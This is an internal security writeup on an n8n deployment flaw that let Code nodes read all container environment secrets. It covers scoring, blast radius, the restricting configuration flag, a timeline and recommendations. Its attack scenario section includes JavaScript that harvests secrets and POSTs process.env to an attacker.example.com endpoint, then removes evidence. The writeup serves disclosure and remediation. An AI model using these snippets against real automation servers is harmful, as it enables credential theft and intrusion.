# Vulnerability Writeup: n8n Code Node Credential Exposure

**Organization:** Organization Security Operations Platform
**Assessment Date:** 2026-03-22
**Assessor:** System Owner
**Methodology:** Manual Architecture Security Review, CVSS v3.1 Scoring
**NIST 800-53 Controls:** AC-6 (Least Privilege), AC-6(1) (Authorize Access to Security Functions), SC-28 (Protection of Information at Rest)
**Classification:** Internal Use Only
**Version:** 1.0

---

## Document Control

| Field | Value |
|-------|-------|
| Document ID | VULN-001 |
| Version | 1.0 |
| Status | Approved |
| Last Revised | 2026-03-22 |
| Next Review | 2026-09-22 |
| Author | Information Security Officer |
| Approver | System Owner |

### Revision History

| Version | Date | Author | Description |
|---------|------|--------|-------------|
| 1.0 | 2026-03-12 | Information Security Officer | Initial release |

---

## 1. Executive Summary

A manual architecture security review of the Organization platform identified that n8n (svc-automation) Code nodes can execute arbitrary JavaScript with unrestricted access to `process.env`, exposing all 44 environment variables injected at container startup. These variables include database credentials, API keys, tunnel tokens, monitoring secrets, and bot tokens. The finding was rated HIGH (CVSS 8.1) and was remediated the same day by enabling the `N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS` configuration flag.

---

## 2. Finding Details

### 2.1 Identification

| Field | Value |
|-------|-------|
| **Finding ID** | VULN-001 |
| **Title** | n8n Code Node Unrestricted Environment Variable Access |
| **Severity** | HIGH |
| **CVSS 3.1 Base Score** | 8.1 |
| **CVSS 3.1 Vector** | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N |
| **CWE** | CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-269 (Improper Privilege Management) |
| **OWASP** | A01:2025 Broken Access Control |
| **Discovery Method** | Manual architecture security review |
| **Affected Component** | svc-automation (n8n) Code node execution engine |
| **Status** | REMEDIATED |

### 2.2 CVSS Vector Justification

| Metric | Value | Justification |
|--------|-------|---------------|
| **Attack Vector (AV)** | Network | svc-automation exposes a web interface accessible through the zero-trust tunnel at `automation.example-ops.com` |
| **Attack Complexity (AC)** | Low | Exploitation requires only creating a Code node and calling `process.env`. No race conditions, special configurations, or chained prerequisites. |
| **Privileges Required (PR)** | Low | Any authenticated n8n user can create workflows containing Code nodes. No elevated privileges needed. |
| **User Interaction (UI)** | None | The Code node executes on trigger without any interaction from another user. |
| **Scope (S)** | Unchanged | The vulnerability operates within the svc-automation container boundary. Secrets from other services are exposed only because they were injected into this container's environment. |
| **Confidentiality (C)** | High | All 44 secrets are readable, including database credentials, infrastructure API keys, and encryption material. |
| **Integrity (I)** | High | With the exposed secrets, an attacker could modify workflows, send messages through bot integrations, alter database records, reconfigure infrastructure via cloud provider API, and manipulate tunnel routing. |
| **Availability (A)** | None | The vulnerability itself does not directly enable denial of service. Downstream misuse of stolen credentials could affect availability, but that is a secondary effect. |

---

## 3. Environment Context

### 3.1 Network Position

svc-automation operates within the `net-core` Docker bridge network, which connects to the following services:

| Network | Connected Services | Purpose |
|---------|--------------------|---------|
| `net-core` | svc-automation, svc-db, svc-secrets, svc-identity, svc-tunnel, svc-monitor, svc-detection, svc-detection-router, svc-log-shipper, svc-event-shipper | Core platform services |
| `net-ai` | svc-automation, svc-llm, svc-transcription, svc-ai-gateway | AI inference pipeline |

svc-automation is the only container that bridges both `net-core` and `net-ai`. This dual-network position means secrets exposed through svc-automation could be leveraged to attack services in either network segment.

### 3.2 Access Path

External access to svc-automation follows this path:

```
Internet
  └─> Cloudflare Tunnel (svc-tunnel)
        └─> svc-automation web interface (port 5678, internal only)
              └─> Authenticated session (username + password)
                    └─> Workflow Editor
                          └─> Code node (JavaScript execution)
                                └─> process.env (ALL secrets)
```

### 3.3 Authentication Requirements

svc-automation requires email-based authentication with a password. There is no multi-factor authentication enforced on the n8n instance itself. The Cloudflare Tunnel provides a transport-layer trust boundary but does not add application-layer authentication.

---

## 4. Attack Scenario

The following is a step-by-step exploitation path from initial access to full secret exfiltration.

### 4.1 Prerequisites

- Authenticated access to the svc-automation web interface
- Ability to create or edit a workflow (default for all authenticated users)

### 4.2 Exploitation Steps

**Step 1: Create a new workflow or edit an existing one.**

Any authenticated user can create a new workflow through the n8n editor interface.

**Step 2: Add a Code node with environment variable enumeration.**

Insert a Code node containing:

```javascript
// Enumerate all available environment variable names
const envKeys = Object.keys(process.env);
return [{ json: { keys: envKeys, count: envKeys.length } }];
```

This returns the names of all 44 environment variables without triggering any security controls.

**Step 3: Extract specific secret values.**

Once the variable names are known, a second Code node retrieves the actual values:

```javascript
// Extract targeted secrets
const targets = ['DB_PASS', 'API_KEY', 'BOT_TOKEN', 'TUNNEL_TOKEN'];
const extracted = {};
targets.forEach(key => {
  const match = Object.keys(process.env).find(k => k.includes(key));
  if (match) extracted[match] = process.env[match];
});
return [{ json: extracted }];
```

**Step 4: Exfiltrate to an external endpoint.**

The attacker routes extracted secrets to an attacker-controlled server:

```javascript
// Exfiltrate via HTTP POST
const secrets = JSON.stringify(process.env);
await fetch('https://attacker.example.com/collect', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: secrets
});
return [{ json: { status: 'sent' } }];
```

Alternatively, the attacker could use the exposed bot token to send secrets to a messaging platform channel they control, using the bot's existing API access.

**Step 5: Clean up evidence.**

The attacker deletes the workflow or modifies the Code node to remove the exfiltration logic. If n8n execution logging is not configured to retain code content, no evidence remains in the execution history.

### 4.3 Detection Difficulty

| Factor | Assessment |
|--------|------------|
| **Network detection** | Low. Outbound HTTPS to arbitrary domains blends with legitimate n8n HTTP Request node traffic. |
| **Application logging** | Low. n8n does not log the full source code of Code nodes during execution by default. |
| **Runtime detection** | Moderate. Falco (svc-detection) could detect unusual outbound connections from the svc-automation container if custom rules are in place. |
| **Audit trail** | Low. Workflow edit history is stored in svc-db but an attacker with database credentials could modify or delete those records. |

---

## 5. Blast Radius Analysis

### 5.1 Exposed Secret Categories

The following table categorizes all 44 environment variables by function and impact tier. No actual values are listed.

| Category | Count | Examples (Variable Names) | Impact if Compromised |
|----------|-------|---------------------------|----------------------|
| **Database Credentials** | 3 | `DB_USER`, `DB_PASS`, `DB_NAME` | Full read/write access to PostgreSQL. Workflow data, credential store, execution history, and audit logs. |
| **Cloud Provider API** | 1 | `CLOUD_PROVIDER_TOKEN` | Instance management, DNS modification, snapshot access, firewall rule changes, resource destruction. |
| **Edge Security / CDN** | 2 | `CDN_API_KEY`, `CDN_EMAIL` | Tunnel reconfiguration, DNS modification, firewall bypass, SSL certificate management. |
| **Tunnel Token** | 1 | `TUNNEL_TOKEN` | Tunnel re-registration, traffic interception, routing modification. |
| **Monitoring / Observability** | 4 | `MONITOR_API_KEY`, `MONITOR_APP_KEY_*` (x3) | Metric manipulation, alert suppression, dashboard tampering, audit log injection. |
| **n8n Internal Secrets** | 4 | `AUTOMATION_KEY`, `AUTOMATION_JWT`, `AUTOMATION_USER`, `AUTOMATION_PASS` | Workflow encryption key compromise, JWT token forgery, admin credential exposure. |
| **n8n API / Integration** | 2 | `AUTOMATION_MCP_TOKEN`, `AUTOMATION_OPEN_KEY` | External system integration abuse, API impersonation. |
| **AI / LLM Keys** | 2 | `LLM_API_KEY`, `AI_GATEWAY_KEY` | Unauthorized LLM API usage, cost accumulation, data exfiltration through prompt injection. |
| **Code Repository** | 2 | `REPO_TOKEN`, `REPO_LOGIN_PASSWORD` | Source code access, CI/CD pipeline manipulation, supply chain injection. |
| **Messaging Bot** | 1 | `BOT_TOKEN` | Bot impersonation, message interception, command injection through bot interface. |
| **Productivity / SaaS** | 4 | `NOTES_API_KEY`, `STORE_API_KEY`, `STORE_ACCESS_TOKEN`, `WORKSPACE_API_KEY` | Data exfiltration from connected SaaS platforms, financial transaction manipulation. |
| **Error Tracking** | 1 | `ERROR_TRACKER_DSN` | Error log access, PII exposure from stack traces, alert manipulation. |
| **Search / AI** | 1 | `SEARCH_API_KEY` | Unauthorized API usage, cost accumulation. |
| **Cloud Office** | 1 | `OFFICE_API_KEY` | Spreadsheet data access and modification. |
| **Object Storage** | 2 | `STORAGE_ACCESS_KEY`, `STORAGE_SECRET_KEY` | Terraform state file access, backup data exposure, state tampering. |
| **AWS Credentials** | 5 | `CLOUD_ACCESS_KEY_ID`, `CLOUD_SECRET_ACCESS_KEY`, `CLOUD_ROOT_PASSWORD`, `CLOUD_PERSONAL_PASSWORD`, `CLOUD_ADMIN_PASSWORD` | Full AWS account access (suspended but credentials still valid for API calls). |
| **Streaming** | 1 | `STREAM_KEY` | Stream hijacking, unauthorized broadcasts. |
| **Network / VPN** | 3 | `VPN_USERNAME`, `VPN_PASSWORD`, `NETWORK_PASSWORD` | VPN account compromise, network gateway access. |
| **Administrative Passwords** | 4 | `AUTOMATION_WEB_PASSWORD`, `AUTOMATION_ADMIN_PASS`, `DB_PASS_1P`, `MONITOR_PASSWORD` | Duplicate admin credential exposure across multiple services. |

### 5.2 Impact Summary

| Impact Dimension | Assessment |
|-----------------|------------|
| **Confidentiality** | Complete. All 44 secrets readable. Every integrated system is exposed. |
| **Integrity** | High. Database write access, workflow manipulation, infrastructure reconfiguration, DNS changes, and code repository modification are all possible. |
| **Availability** | Moderate (indirect). Attacker could destroy infrastructure via cloud provider API, corrupt database, or disable tunnel connectivity. |
| **Financial** | Moderate. Unauthorized LLM API consumption, cloud resource creation, and SaaS platform abuse. |
| **Lateral Movement** | High. Database credentials enable access to all n8n credential stores. Cloud provider token enables infrastructure-level pivoting. Code repository token enables supply chain attacks. |

---

## 6. Remediation

### 6.1 Fix Applied

Set the following environment variable in the svc-automation container configuration:

```
N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS=true
```

This n8n configuration flag disables `process.env` access from within Code nodes. When enabled, any attempt to read `process.env` from a Code node returns an empty object.

### 6.2 Implementation Location

The fix was applied in the Docker Compose environment configuration on `primary-node`:

```yaml
svc-automation:
  environment:
    - N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS=true
    # ... other environment variables
```

### 6.3 Verification

**Before remediation:**

```javascript
// Code node output BEFORE fix
{
  "keys": ["DB_USER", "DB_PASS", "DB_NAME", "...43 more..."],
  "count": 44
}
```

**After remediation:**

```javascript
// Code node output AFTER fix
{
  "keys": [],
  "count": 0
}
```

### 6.4 Verification Command

After applying the fix and restarting the container, verification was performed by executing a test workflow containing the following Code node:

```javascript
const keys = Object.keys(process.env);
return [{ json: { accessible_count: keys.length, keys: keys } }];
```

Result confirmed: `accessible_count: 0`, `keys: []`.

### 6.5 Side Effects

None observed. n8n workflows that legitimately need external data should use the n8n Credentials system (encrypted at rest using `AUTOMATION_KEY`) rather than reading raw environment variables. No existing production workflows relied on direct `process.env` access.

---

## 7. Timeline

| Date | Time | Event | Actor |
|------|------|-------|-------|
| 2026-03-22 | 09:00 | Manual architecture security review initiated | System Owner |
| 2026-03-22 | 09:30 | Discovery: Code node `process.env` access confirmed with test workflow | System Owner |
| 2026-03-22 | 09:45 | CVSS scoring completed, rated HIGH (8.1) | Information Security Officer |
| 2026-03-22 | 10:00 | Blast radius analysis completed, 44 secrets confirmed exposed | Information Security Officer |
| 2026-03-22 | 10:15 | Remediation applied: `N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS=true` | System Owner |
| 2026-03-22 | 10:20 | svc-automation container restarted | System Owner |
| 2026-03-22 | 10:25 | Verification completed: `process.env` returns empty object | System Owner |
| 2026-03-22 | 10:30 | Existing workflows tested for regressions, none found | System Owner |
| 2026-03-22 | 11:00 | Vulnerability writeup completed | Information Security Officer |

**Time to remediation:** 45 minutes from discovery to verified fix.

---

## 8. Root Cause Analysis

### 8.1 Immediate Cause

n8n's default configuration does not restrict Code node access to the host process environment. The `N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS` flag defaults to `false`, prioritizing developer convenience and backward compatibility over security isolation.

### 8.2 Contributing Factors

| Factor | Description |
|--------|-------------|
| **Secret injection method** | All 44 secrets are injected as environment variables through the Docker Compose `.env` file. This is the standard method for containerized applications but creates a flat namespace where every variable is equally accessible to any process in the container. |
| **n8n's execution model** | Code nodes run JavaScript in a Node.js VM context that shares the process environment with the n8n server process. There is no sandboxing or capability restriction between the workflow engine and user-authored code. |
| **Single-container secret scope** | Docker Compose environment variables are scoped to the container, not to individual processes within the container. Every process inside svc-automation, including user-authored Code nodes, inherits the full environment. |
| **Missing hardening checklist** | The initial deployment of svc-automation did not include a review of n8n-specific security configuration flags. The `N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS` flag was not in the deployment checklist. |
| **Documentation gap** | n8n's documentation does not prominently surface this security risk. The flag exists but is not part of the default security hardening guidance for self-hosted deployments. |

### 8.3 Systemic Root Cause

The Organization's deployment process for SOAR platforms did not include an application-specific security configuration review. Infrastructure-level hardening (network isolation, resource limits, read-only filesystems, no-new-privileges) was thorough, but application-layer security settings within the container were not systematically audited.

---

## 9. Lessons Learned

### 9.1 Environment Variable Hygiene

Environment variables are the most common secret injection method for containerized applications, but they create a flat trust surface. Any process inside the container can read every variable. Organizations should:

- Use restrictive flags when the application provides them (as n8n does)
- Consider migrating to dynamic secret injection through Vault AppRole authentication, which provides per-service, time-limited credentials instead of static environment variables
- Audit the minimum set of environment variables each container actually needs and remove unnecessary secrets from the container's scope

### 9.2 Defense-in-Depth for SOAR Platforms

SOAR platforms like n8n occupy a privileged position in the infrastructure. They require credentials for every system they integrate with, making them high-value targets. Security controls for SOAR platforms should include:

- Application-layer security configuration review (not just infrastructure-level hardening)
- Principle of least privilege applied to credential scoping within the SOAR platform itself
- Separation of workflow execution environments from administrative credential stores
- Monitoring for unusual outbound network connections from the SOAR container

### 9.3 OWASP LLM07 Parallel: Insecure Plugin Design

This finding parallels OWASP LLM Top 10 item LLM07 (Insecure Plugin Design). In the LLM context, plugins execute with the LLM's full permission set without granular access controls. Similarly, n8n Code nodes execute with the n8n process's full environment access without granular scoping. The mitigation pattern is the same: restrict the execution context to the minimum privileges needed for the specific task.

### 9.4 Application-Specific Hardening Reviews

Every application deployed on the platform should undergo a security configuration review that covers:

- Default settings that favor convenience over security
- Execution environments for user-authored code or plugins
- Secret access scoping within the application
- Logging and audit trail completeness for security-relevant actions
- Network egress restrictions for components that execute user-provided logic

---

## 10. Recommendations

| Priority | Recommendation | Status | Timeline |
|----------|---------------|--------|----------|
| **P1** | Enable `N8N_RESTRICT_ENVIRONMENT_VARIABLES_ACCESS=true` | COMPLETE | Same day |
| **P2** | Add n8n security flags to deployment hardening checklist | OPEN | 30 days |
| **P3** | Implement Falco custom rule for unusual outbound connections from svc-automation | OPEN | 60 days |
| **P4** | Migrate from static environment variables to Vault AppRole dynamic credentials | OPEN | 90 days (tracked in POA&M) |
| **P5** | Conduct application-specific security configuration reviews for all 14 containers | OPEN | 90 days |
| **P6** | Implement n8n execution logging that captures Code node source and output | OPEN | 60 days |

---

## 11. Cross-References

| Document | Relevance |
|----------|-----------|
| [CODE_REVIEW_FINDINGS.md](CODE_REVIEW_FINDINGS.md) | Finding CR-001-F1 references this vulnerability. Full code review context. |
| [POLICY_ACCESS_CONTROL.md](POLICY_ACCESS_CONTROL.md) | AC-6 (Least Privilege) control implementation details |
| [CIS_RISK_REGISTER.md](CIS_RISK_REGISTER.md) | Container hardening findings and compensating controls |
| [RISK_ASSESSMENT.md](RISK_ASSESSMENT.md) | Platform-wide risk assessment including SOAR compromise scenarios |
| [PLAYBOOK_LEAKED_CREDENTIAL.md](PLAYBOOK_LEAKED_CREDENTIAL.md) | Response procedure if exposed credentials had been exfiltrated |
| [POLICY_VULNERABILITY_MANAGEMENT.md](POLICY_VULNERABILITY_MANAGEMENT.md) | Vulnerability classification and remediation SLA (HIGH = 14 days, remediated same day) |
| [THREAT_MODEL_STRIDE.md](THREAT_MODEL_STRIDE.md) | STRIDE analysis of svc-automation trust boundary |
| [DATA_FLOW_DIAGRAM.md](DATA_FLOW_DIAGRAM.md) | Data flows showing svc-automation's dual-network position |
| [AI_THREAT_CATALOG.md](AI_THREAT_CATALOG.md) | AI-specific threat context for SOAR platforms with LLM integration |
| [POAM_PLAN_OF_ACTION.md](POAM_PLAN_OF_ACTION.md) | Vault AppRole migration tracked as POA&M item |

---

## 12. Approval

| Role | Name | Date | Signature |
|------|------|------|-----------|
| Author | Information Security Officer | 2026-03-22 | /s/ |
| Reviewer | System Owner | 2026-03-22 | /s/ |
| Approver | System Owner | 2026-03-22 | /s/ |

---

*This document is classified as Internal Use Only. Distribution is limited to personnel with a need to know. Do not share outside the Organization without written authorization from the System Owner.*
